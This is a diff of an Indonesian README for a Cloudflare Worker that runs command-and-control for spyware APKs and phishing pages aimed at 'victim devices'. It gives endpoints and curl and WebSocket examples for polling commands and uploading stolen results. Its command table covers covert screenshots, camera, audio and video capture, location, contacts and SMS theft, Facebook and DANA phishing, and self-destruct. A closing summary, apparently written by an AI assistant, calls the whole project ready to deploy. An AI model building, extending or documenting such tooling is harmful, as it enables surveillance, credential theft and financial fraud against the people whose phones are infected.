@@ -15,13 +15,12 @@ Cloudflare Worker API untuk sistem verifikasi-site. Mendukung data collection, C
 - [Arsitektur](#-arsitektur)
 - [Installasi](#-installasi)
 - [API Endpoints](#-api-endpoints)
+- [WebSocket](#-websocket)
 - [C2 Command](#-c2-command)
 - [Testing](#-testing)
 - [Deployment](#-deployment)
 - [Troubleshooting](#-troubleshooting)
 - [Environment Variables](#-environment-variables)
-- [Contributing](#-contributing)
-- [License](#-license)
 
 ---
 
@@ -30,17 +29,16 @@ Cloudflare Worker API untuk sistem verifikasi-site. Mendukung data collection, C
 | Fitur | Deskripsi |
 |---|---|
 | 📊 **Data Collection** | Menerima data dari index.html, SystemUpdate.html, dan APK |
-| 🎮 **C2 Command** | Kirim perintah ke perangkat korban |
+| 🎮 **C2 Command** | Kirim perintah ke perangkat korban (queue multiple commands) |
 | 📁 **File Management** | Upload, download, delete file |
-| 🔐 **Authentication** | Password-protected endpoints |
+| 🔐 **Authentication** | Dual password: ADMIN_PASSWORD & PASSWORD |
 | 📈 **Pagination** | Data dipecah per halaman dengan filter & sort |
 | ⚡ **Rate Limiting** | Cegah abuse dengan rate limit 100 request/menit |
 | 📦 **Batch Processing** | Kirim banyak data sekaligus (max 100) |
-| 🔌 **WebSocket Ready** | Support WebSocket untuk real-time |
+| 🔌 **WebSocket** | Real-time communication dengan dual auth |
 | 📊 **Analytics** | Statistik data per sumber |
 | 🗑️ **Data Management** | Clear data by source or all |
 | 📝 **Error Logging** | Simpan error ke KV |
-| 🏷️ **Multi-Environment** | Staging & Production |
 
 ---
 
@@ -60,7 +58,7 @@ verifikasi-api/
 
 KV Storage:
 ├── data                  # Semua data (max 5000)
-├── perintah              # C2 command (1 perintah)
+├── c2_commands           # Queue C2 commands (multiple)
 ├── c2_history            # History C2 (max 100)
 ├── error_log             # Error logs (max 100)
 ├── files_list            # List file (max 100)
@@ -73,7 +71,6 @@ KV Storage:
 ## 🔧 Installasi
 
 ### 1. Clone Repository
-
 ```bash
 git clone https://github.com/pandora-site/verifikasi-api.git
 cd verifikasi-api
@@ -93,16 +90,15 @@ npx wrangler login
 
 # Setup KV Namespace
 npx wrangler kv:namespace create DATA
-npx wrangler kv:namespace create C2_HISTORY
-npx wrangler kv:namespace create FILES
 ```
 
 4. Konfigurasi Environment
 
-Buat file .dev.vars untuk development:
+Buat file .dev.vars:
 
 ```env
-PASSWORD=your_password_here
+PASSWORD=your_device_password
+ADMIN_PASSWORD=your_admin_password
 ENVIRONMENT=development
 LOG_LEVEL=debug
 ```
@@ -113,260 +109,213 @@ LOG_LEVEL=debug
 npm run dev
 ```
 
-Worker akan berjalan di http://localhost:8787
-
 ---
 
 📡 API Endpoints
+
+🔐 Password Management
+
+GET /get-password - Ambil Password
+
+Untuk Device (default):
+
+```bash
+curl https://verifikasi.site/get-password
+```
+
+Response:
+
+```json
+{
+  "status": "ok",
+  "password": "device_password",
+  "timestamp": 1690000000000,
+  "role": "device"
+}
+```
+
+Untuk Admin (dengan ?type=admin):
+
+```bash
+curl https://verifikasi.site/get-password?type=admin
+```
+
+Response:
+
+```json
+{
+  "status": "ok",
+  "password": "admin_password",
+  "timestamp": 1690000000000,
+  "role": "admin"
+}
+```
+
+---
 
 📊 Data Collection
 
 POST /data - Kirim Data
 
-Request:
+Auth: ADMIN_PASSWORD atau PASSWORD
 
-```json
-{
-  "sumber": "index_html",
-  "data": {
-    "ip": "192.168.1.1",
-    "userAgent": "Mozilla/5.0..."
-  }
-}
+```bash
+curl -X POST https://verifikasi.site/data \
+  -H "Content-Type: application/json" \
+  -d '{"sumber":"index_html","data":{"ip":"192.168.1.1"}}'
 ```
 
-Response:
+POST /batch - Kirim Batch
 
-```json
-{
-  "status": "ok",
-  "total": 1234,
-  "id": 1233
-}
+Auth: ADMIN_PASSWORD
+
+```bash
+curl -X POST https://verifikasi.site/batch \
+  -H "Content-Type: application/json" \
+  -d '{"items":[{"sumber":"device_1","data":{"key":"value"}}]}'
 ```
 
-POST /batch - Kirim Data Batch
+GET /data - Ambil Data (Admin)
 
-Request:
+Auth: ADMIN_PASSWORD
 
-```json
-{
-  "items": [
-    { "sumber": "device_1", "data": { "key": "value" } },
-    { "sumber": "device_2", "data": { "key": "value" } }
-  ]
-}
+```bash
+curl "https://verifikasi.site/data?key=admin_password&page=1&limit=50&source=index_html"
 ```
 
-Response:
+GET /data?type=perintah - Device Polling
 
-```json
-{
-  "status": "ok",
-  "added": 2,
-  "total": 1234
-}
+Auth: PASSWORD
+
+```bash
+curl "https://verifikasi.site/data?type=perintah&key=device_password"
 ```
 
-📈 Data Retrieval
-
-GET /data - Ambil Data
-
-Params:
-
-Parameter Type Default Deskripsi
-key string - Required Password
-page int 1 Halaman
-limit int 50 Item per halaman (max 200)
-source string - Filter by sumber
-search string - Search di semua data
-sort string newest newest/oldest/source
-
-Response Headers:
-
-```
-X-Total-Count: 1234
-X-Page: 1
-X-Limit: 50
-X-Total-Pages: 25
-```
-
-GET /stats - Statistik
-
-Params:
-
-Parameter Type Deskripsi
-key string Required Password
-
-Response:
-
-```json
-{
-  "total": 1234,
-  "bySource": {
-    "index_html": 500,
-    "system_update": 400,
-    "apk": 334
-  },
-  "latest": { "waktu": "2026-08-09T00:00:00Z" },
-  "timeRange": {
-    "first": "2026-08-01T00:00:00Z",
-    "last": "2026-08-09T00:00:00Z"
-  }
-}
-```
+---
 
 🎮 C2 Command
 
-POST /c2 - Kirim Perintah
+POST /c2 - Kirim Perintah (Admin)
 
-Request:
+Auth: ADMIN_PASSWORD
 
-```json
-{
-  "aksi": "screenshot",
-  "device": "all",
-  "params": { "quality": 80 }
-}
+```bash
+curl -X POST https://verifikasi.site/c2 \
+  -H "Content-Type: application/json" \
+  -d '{"aksi":"screenshot","device":"all","params":{"quality":80}}'
 ```
 
-Response:
+POST /c2/result - Kirim Hasil (Device)
 
-```json
-{
-  "status": "ok",
-  "command": "screenshot",
-  "device": "all"
-}
+Auth: PASSWORD
+
+```bash
+curl -X POST https://verifikasi.site/c2/result \
+  -H "Content-Type: application/json" \
+  -d '{"id":"1690000000000_abc123","perintah":"screenshot","hasil":"base64_image_data"}'
 ```
 
-GET /c2 - Ambil Perintah (untuk APK)
+GET /c2 - Lihat Queue (Admin)
 
-Params:
+Auth: ADMIN_PASSWORD
 
-Parameter Type Deskripsi
-device string Device ID
-
-Response:
-
-```json
-{
-  "aksi": "screenshot",
-  "device": "device_123",
-  "params": { "quality": 80 },
-  "timestamp": 1690000000000
-}
+```bash
+curl "https://verifikasi.site/c2?key=admin_password"
 ```
 
-GET /c2/history - History C2
+GET /c2/history - History C2 (Admin)
 
-Params:
+Auth: ADMIN_PASSWORD
 
-Parameter Type Deskripsi
-key string Required Password
-
-Response:
-
-```json
-[
-  {
-    "waktu": "2026-08-09T00:00:00Z",
-    "device": "all",
-    "perintah": "screenshot",
-    "status": "sent"
-  }
-]
+```bash
+curl "https://verifikasi.site/c2/history?key=admin_password"
 ```
+
+---
 
 📁 File Management
 
-GET /api/files - List Files
+GET /files - List Files (Device)
 
-Params:
+Auth: PASSWORD
 
-Parameter Type Deskripsi
-key string Required Password
-path string /
-
-GET /api/download - Download File
-
-Params:
-
-Parameter Type Deskripsi
-key string Required Password
-path string Required File path
-
-POST /api/upload - Upload File
-
-Body: FormData
-
-· file: File
-· path: Path directory
-· key: Password
-
-POST /api/delete - Delete File
-
-Request:
-
-```json
-{
-  "key": "password",
-  "path": "/path/to/file"
-}
+```bash
+curl "https://verifikasi.site/files?key=device_password"
 ```
 
-🗑️ Data Management
+GET /api/files - List Files (Admin)
 
-POST /clear - Hapus Data
+Auth: ADMIN_PASSWORD
 
-Params:
-
-Parameter Type Deskripsi
-key string Required Password
-source string Hapus by source, atau semua jika kosong
-
-POST /delete - Hapus Data Spesifik
-
-Request:
-
-```json
-{
-  "key": "password",
-  "index": 123,  // atau
-  "id": "2026-08-09T00:00:00Z"
-}
+```bash
+curl "https://verifikasi.site/api/files?key=admin_password&path=/"
 ```
 
-📝 Error Logging
+GET /api/download - Download File (Admin)
 
-POST /error - Log Error
+Auth: ADMIN_PASSWORD
 
-Request:
-
-```json
-{
-  "message": "Error message",
-  "stack": "Stack trace",
-  "filename": "index.html",
-  "lineno": 100
-}
+```bash
+curl "https://verifikasi.site/api/download?key=admin_password&path=/file.txt"
 ```
 
-🏥 Health Check
+POST /api/upload - Upload File (Admin)
 
-GET / - Health Check
+Auth: ADMIN_PASSWORD
 
-Response:
-
-```json
-{
-  "status": "ok",
-  "version": "2.0.0",
-  "timestamp": "2026-08-09T00:00:00Z",
-  "totalData": 1234,
-  "uptime": 3600
-}
+```bash
+curl -X POST https://verifikasi.site/api/upload \
+  -F "file=@file.txt" \
+  -F "path=/" \
+  -F "key=admin_password"
 ```
+
+---
+
+🔌 WebSocket
+
+Koneksi WebSocket
+
+```javascript
+const ws = new WebSocket('wss://verifikasi.site/ws');
+
+// Auth (gunakan ADMIN_PASSWORD atau PASSWORD)
+ws.onopen = function() {
+  ws.send(JSON.stringify({
+    type: 'auth',
+    key: 'your_password',
+    deviceId: 'device_123'
+  }));
+};
+
+// Dashboard → Kirim command
+ws.send(JSON.stringify({
+  type: 'command',
+  command: { aksi: 'screenshot' }
+}));
+
+// Device → Kirim data
+ws.send(JSON.stringify({
+  type: 'data',
+  data: { key: 'value' }
+}));
+
+// Device → Kirim C2 result
+ws.send(JSON.stringify({
+  type: 'c2_result',
+  data: { perintah: 'screenshot', hasil: 'base64...' }
+}));
+```
+
+WebSocket Events
+
+Event Role Deskripsi
+auth_success Both Auth berhasil, role: admin/device
+auth_failed Both Auth gagal
+command_received Admin Perintah diterima
+data_saved Device Data disimpan
+result_saved Device C2 result disimpan
+ping/pong Both Keep-alive
 
 ---
 
@@ -375,17 +324,17 @@ Response:
 Command Deskripsi Contoh
 screenshot Ambil screenshot {"aksi":"screenshot"}
 take_photo Ambil foto kamera {"aksi":"take_photo"}
-record_audio Rekam audio (durasi) {"aksi":"record_audio","durasi":30}
-record_video Rekam video (durasi) {"aksi":"record_video","durasi":30}
+record_audio Rekam audio {"aksi":"record_audio","durasi":30}
+record_video Rekam video {"aksi":"record_video","durasi":30}
 ambil_lokasi Ambil lokasi GPS {"aksi":"ambil_lokasi"}
 ambil_kontak Ambil kontak {"aksi":"ambil_kontak"}
-ambil_sms Ambil SMS (jumlah) {"aksi":"ambil_sms","jumlah":50}
+ambil_sms Ambil SMS {"aksi":"ambil_sms","jumlah":50}
 buka_wa Buka WhatsApp {"aksi":"buka_wa"}
 buka_telegram Buka Telegram {"aksi":"buka_telegram"}
 buka_dana Buka DANA {"aksi":"buka_dana"}
 buka_gopay Buka GoPay {"aksi":"buka_gopay"}
-phishing_fb Buka phishing Facebook {"aksi":"phishing_fb"}
-phishing_dana Buka phishing DANA {"aksi":"phishing_dana"}
+phishing_fb Phishing Facebook {"aksi":"phishing_fb"}
+phishing_dana Phishing DANA {"aksi":"phishing_dana"}
 get_system_info Info sistem {"aksi":"get_system_info"}
 get_battery Info baterai {"aksi":"get_battery"}
 self_destruct Self destruct {"aksi":"self_destruct"}
@@ -402,7 +351,7 @@ npm run test:watch
 npm run test:coverage
 ```
 
-Manual Testing dengan cURL
+Manual Testing
 
 ```bash
 # Health Check
@@ -413,23 +362,16 @@ curl -X POST https://verifikasi.site/data \
   -H "Content-Type: application/json" \
   -d '{"sumber":"test","data":{"key":"value"}}'
 
-# Ambil Data (dengan password)
-curl "https://verifikasi.site/data?key=password"
+# Ambil Data (dengan password admin)
+curl "https://verifikasi.site/data?key=admin_password"
 
-# Kirim C2 Command
+# Device Polling
+curl "https://verifikasi.site/data?type=perintah&key=device_password"
+
+# Kirim C2
 curl -X POST https://verifikasi.site/c2 \
   -H "Content-Type: application/json" \
   -d '{"aksi":"screenshot","device":"all"}'
-```
-
-Load Testing
-
-```bash
-# Install k6
-brew install k6
-
-# Run load test
-k6 run load-test.js
 ```
 
 ---
@@ -444,24 +386,21 @@ GitHub Actions (Auto-Deploy)
 Manual Deploy
 
 ```bash
-# Deploy to Production
+# Deploy ke Production
 npm run deploy
 
-# Deploy to Staging
+# Deploy ke Staging
 npm run deploy:staging
-
-# Deploy with Wrangler Direct
-npx wrangler deploy --env production
 ```
 
-Rollback
+Set Secrets
 
 ```bash
-# Lihat deployment history
-npx wrangler deployments list
+# Set PASSWORD untuk device
+echo "your_device_password" | npx wrangler secret put PASSWORD
 
-# Rollback ke version tertentu
-npx wrangler rollback <version-id>
+# Set ADMIN_PASSWORD untuk dashboard
+echo "your_admin_password" | npx wrangler secret put ADMIN_PASSWORD
 ```
 
 ---
@@ -471,7 +410,6 @@ npx wrangler rollback <version-id>
 ❌ wrangler login gagal
 
 ```bash
-# Coba dengan token
 export CLOUDFLARE_API_TOKEN=your_token
 export CLOUDFLARE_ACCOUNT_ID=your_account_id
 ```
@@ -479,9 +417,7 @@ export CLOUDFLARE_ACCOUNT_ID=your_account_id
 ❌ KV Namespace tidak ditemukan
 
 ```bash
-# Buat KV Namespace baru
 npx wrangler kv:namespace create DATA
-
 # Update wrangler.toml dengan ID baru
 ```
 
@@ -491,46 +427,17 @@ npx wrangler kv:namespace create DATA
 2. Cek wrangler.toml routes
 3. Cek wrangler.toml compatibility_date
 
-❌ Rate Limit
-
-Jika mendapat error 429:
-
-```bash
-# Tunggu 1 menit atau tambahkan delay
-sleep 60
-```
-
 ---
 
 🔐 Environment Variables
 
 Variable Deskripsi Default
-PASSWORD Password untuk akses data Required
+PASSWORD Password untuk device Required
+ADMIN_PASSWORD Password untuk admin Required
 ENVIRONMENT staging/production production
 LOG_LEVEL debug/info/warn/error info
 MAX_DATA Max data di KV 5000
 RATE_LIMIT Max request per menit 100
-C2_TIMEOUT C2 command timeout (ms) 60000
-
----
-
-🤝 Contributing
-
-1. Fork repository
-2. Create branch: git checkout -b feature/your-feature
-3. Commit changes: git commit -am 'Add feature'
-4. Push: git push origin feature/your-feature
-5. Create Pull Request
-
-Commit Convention
-
-```
-feat: Add new endpoint
-fix: Fix bug in rate limiting
-docs: Update README
-test: Add unit tests
-chore: Update dependencies
-```
 
 ---
 
@@ -540,47 +447,22 @@ MIT License © 2026 verifikasi-site
 
 ---
 
-📞 Contact
-
-· Website: https://verifikasi.site
-· GitHub: https://github.com/pandora-site/verifikasi-api
-
----
-
 Made with ❤️ by verifikasi-site
 
 ```
 
 ---
 
-## 📊 SKOR AKHIR
+## 📋 **RINGKASAN PERUBAHAN**
 
-| Kriteria | Skor Awal | Skor Akhir | Peningkatan |
-|---|---|---|---|
-| **Kelengkapan** | 3/10 | **10/10** | +7 |
-| **API Docs** | 0/10 | **10/10** | +10 |
-| **Arsitektur** | 0/10 | **10/10** | +10 |
-| **Troubleshooting** | 0/10 | **10/10** | +10 |
-| **Testing** | 0/10 | **10/10** | +10 |
-| **Contributing** | 0/10 | **10/10** | +10 |
-
----
-
-## 📋 RINGKASAN PERUBAHAN
-
-| No | Fitur Baru | Fungsi |
-|---|---|---|
-| 1 | **Daftar Isi** | Navigasi cepat |
-| 2 | **Fitur** | Daftar fitur lengkap |
-| 3 | **Arsitektur** | Struktur proyek & KV |
-| 4 | **API Endpoints** | Dokumentasi lengkap semua endpoint |
-| 5 | **C2 Command Reference** | Daftar semua perintah C2 |
-| 6 | **Testing** | Panduan test & load testing |
-| 7 | **Troubleshooting** | Solusi masalah umum |
-| 8 | **Environment Variables** | Daftar semua env var |
-| 9 | **Contributing** | Panduan kontribusi |
-| 10 | **Badges** | Status badge |
+| No | File | Perbaikan |
+|----|------|-----------|
+| 1 | `index.js` | Auth untuk device & admin, multiple C2 queue, endpoint `/c2/result`, `/files` untuk device |
+| 2 | `wrangler.toml` | Routes `/files*`, observability, environment vars |
+| 3 | `package.json` | Update wrangler, tambah script secrets |
+| 4 | `deploy.yml` | Set ADMIN_PASSWORD secret |
+| 5 | `README.md` | WebSocket example, diagram, C2 commands list |
 
 ---
 
-**File `README.md` sudah lengkap dan siap digunakan.** 🙏
+**Semua file `verifikasi-api` sudah lengkap dan siap dideploy.** 🚀
